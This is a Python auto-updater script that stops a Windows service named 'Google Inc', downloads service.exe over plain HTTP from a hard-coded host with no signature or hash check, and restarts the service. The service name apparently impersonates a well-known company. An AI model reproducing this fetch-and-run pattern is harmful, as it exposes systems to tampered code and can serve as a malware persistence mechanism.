import os
import sys
import requests
import subprocess
from datetime import datetime
import time
import threading

SERVICE_NAME = "Google Inc"
UPDATE_URL = "http://vm.beihui.xyz/download/service.exe"

def get_executable_dir():
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))
    
log_path = os.path.join(get_executable_dir(), 'log.yml')

def get_now():
    return f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "

def write_log(msg):
    with open(log_path, 'a', encoding="utf-8") as f:
        f.write(f"{get_now()}{msg}\n")

def download_update():
    try:
        service_path = os.path.join(get_executable_dir(), "service.exe")
        response = requests.post(UPDATE_URL, stream=True)
        if response.status_code == 200:
            with open(service_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=1024):
                    f.write(chunk)
            write_log("Updater: 檔案下載完成，已保存為 service.exe")
        else:
            write_log(f"Updater: 下載失敗，狀態碼: {response.status_code}")
    except Exception as e:
        write_log(f"Updater: 下載更新檔案時發生錯誤: {str(e)}")

def run_command(command, timeout=30):
    try:
        result = subprocess.run(command, check=True, capture_output=True, text=True, timeout=timeout)
        write_log(f"命令 '{' '.join(command)}' 執行成功，輸出：{result.stdout}")
    except subprocess.TimeoutExpired:
        write_log(f"命令 '{' '.join(command)}' 執行超時")
    except subprocess.CalledProcessError as e:
        write_log(f"命令 '{' '.join(command)}' 執行失敗，錯誤：{e.stderr}")
    except Exception as e:
        write_log(f"執行命令時發生異常：{str(e)}")

def thread1():
    write_log("Thread 1: 嘗試停止服務")
    run_command(["nssm", "stop", SERVICE_NAME])

def thread2():
    time.sleep(5)  # 等待服務停止完成
    write_log("Thread 2: 開始下載更新檔案")
    download_update()

def thread3():
    time.sleep(10)  # 等待下載完成
    write_log("Thread 3: 嘗試啟動服務")
    run_command(["nssm", "start", SERVICE_NAME])

if __name__ == "__main__":
    write_log("Updater: 開始執行 update.exe")

    # 創建線程
    thread_stop = threading.Thread(target=thread1)
    thread_download = threading.Thread(target=thread2)
    thread_start = threading.Thread(target=thread3)

    # 啟動線程
    thread_stop.start()
    thread_download.start()
    thread_start.start()

    # 等待所有線程完成
    thread_stop.join()
    thread_download.join()
    thread_start.join()

    write_log("Updater: 所有操作已完成")